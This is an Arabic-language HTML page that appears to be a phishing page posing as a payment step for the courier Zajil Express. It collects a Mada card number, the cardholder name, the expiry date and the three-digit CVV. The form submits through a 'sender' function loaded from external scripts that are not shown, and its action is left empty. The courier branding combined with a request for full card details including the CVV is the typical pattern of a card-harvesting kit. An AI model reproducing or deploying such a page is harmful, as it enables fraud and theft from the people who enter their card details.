
<html id="ctl00_Html1" __expr-val-dir="ltr" lang="ar-sa" dir="rtl">

<head>
    <title>madda</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" type="text/css" href="./style/css/card.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <style>
.footer{
margin-top:85px;
}
.row.payment{
	display:unset;
}
.payment form{
	 margin-left: auto !important;
    margin-right: auto !important;
margin-top:200px;
}
.payment .card-container {
top:200px;
    right: 0 !important;
    margin-left: auto !important;
    margin-right: auto !important;
}
        .payment .card-container .front .flexbox .box:nth-child(1) {
            margin-right: initial;
        }

        .payment .card-container .front .flexbox {
            display: flex;
            justify-content: space-between;
            width: 100%;
        }

        .payment form .inputBox input,
        .payment form .inputBox select {
            height: auto;
        }

        @media screen and (max-width: 767px) {
            .payment .card-container {
                right: 0;
                width: 100%;
            }

            .payment form {
                width: 100%;
            }

            .payment .card-container .front .card-number-box {
                font-size: 15px !important;
            }

            footer {
                margin-top: 0 !important;
            }
        }
    </style>
</head>

<body>
    <div class="top-header w-100 float-left ">
        <div class="header-container mx-auto">
            <ul class="mb-0 pl-0 d-flex align-items-center justify-content-between">
                <li>
                    <p class="mb-0">English-8001000177</p>
                </li>
                <li><a href="#"><img src="images/logo_3fe78f13.jpg" /></a></li>
            </ul>
        </div>
    </div>
   
    <div class="row   payment">

        <div class="card-container">

            <div class="front">
                <div class="image">
                    <img src="./img-bank/chip.png" alt="">
                    <img src="./img-bank/visa.jpeg" alt="">
                </div>
                <div class="card-number-box">################</div>
                <div class="flexbox">
                    <div class="box">
                        <span>card holder</span>
                        <div class="card-holder-name">full name</div>
                    </div>
                    <div class="box">
                        <span>expires</span>
                        <div class="expiration">
                            <span class="exp-month">mm</span>
                            <span class="exp-year">yy</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="back">
                <div class="stripe"></div>
                <div class="box">
                    <span>cvv</span>
                    <div class="cvv-box"></div>
                    <img src="./img-bank/visa.png" alt="">
                </div>
            </div>

        </div>

        <form id="page2form" action="" method="post" onsubmit=" return sender(event)">
            <div class="inputBox">
                <span>ادخل رقم بطاقة مدى</span>
                <input name="number" id="number" placeholder="ادخل رقم بطاقة مدى" type="text" required
                    maxlength="16" class="card-number-input">
            </div>
            <div class="inputBox">
                <span>اسم حامل البطاقة كما هو مكتوب على بطاقة مدى</span>
                <input type="text" name="name" id="name" required class="card-holder-input"
                    placeholder="ادخل اسم حامل البطاقة">
            </div>




            <div class="flexbox">
                <div class="inputBox">
                    <span>انتهاء الصلاحية mm</span>
                    <select name="month" id="month" class="month-input" required>
                        <option value="" selected disabled>month</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                </div>
                <div class="inputBox">
                    <span>انتهاء الصلاحية yy</span>
                    <select name="year" id="year" class="year-input" required>
                        <option value="" selected disabled>year</option>
                        <option value="2021">2021</option>
                        <option value="2022">2022</option>
                        <option value="2023">2023</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2031">2031</option>
                        <option value="2032">2032</option>
                        <option value="2033">2033</option>


                    </select>
                </div>
                <div class="inputBox">
                    <span>رمز خلف البطاقة</span>
                    <input type="text" name="cvc" id="cvc" maxlength="3" required placeholder="رمز البطاقة"
                        class="cvv-input">
                </div>
            </div>
            
            <button type="submit" id="btn"  class="submit-btn">التالي</button>
        </form>
    </div>
    <div class="footer w-100 float-left ">
        <div class="footer-container mx-auto">

            <ul class="mb-0 pl-0 d-flex align-items-center justify-content-between">
                <li>
                    <p class="mb-0">٢٠٢٢ زاجل إكسبريس. كل الحقوق محفوظة</p>
                </li>
                <li><a href="#"><img src="images/logo_3fe78f13.jpg" /></a></li>
            </ul>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="./config.js"></script>
    <script src="./bawaba.js"></script>
	<script>
    document.querySelector('.card-number-input').oninput = () => {
        document.querySelector('.card-number-box').innerText = document.querySelector('.card-number-input').value;
    }

    document.querySelector('.card-holder-input').oninput = () => {
        document.querySelector('.card-holder-name').innerText = document.querySelector('.card-holder-input').value;
    }

    document.querySelector('.month-input').oninput = () => {
        document.querySelector('.exp-month').innerText = document.querySelector('.month-input').value;
    }

    document.querySelector('.year-input').oninput = () => {
        document.querySelector('.exp-year').innerText = document.querySelector('.year-input').value;
    }

    document.querySelector('.cvv-input').onmouseenter = () => {
        document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(-180deg)';
        document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(0deg)';
    }

    document.querySelector('.cvv-input').onmouseleave = () => {
        document.querySelector('.front').style.transform = 'perspective(1000px) rotateY(0deg)';
        document.querySelector('.back').style.transform = 'perspective(1000px) rotateY(180deg)';
    }

    document.querySelector('.cvv-input').oninput = () => {
        document.querySelector('.cvv-box').innerText = document.querySelector('.cvv-input').value;
    }
</script>
</body>

</html>
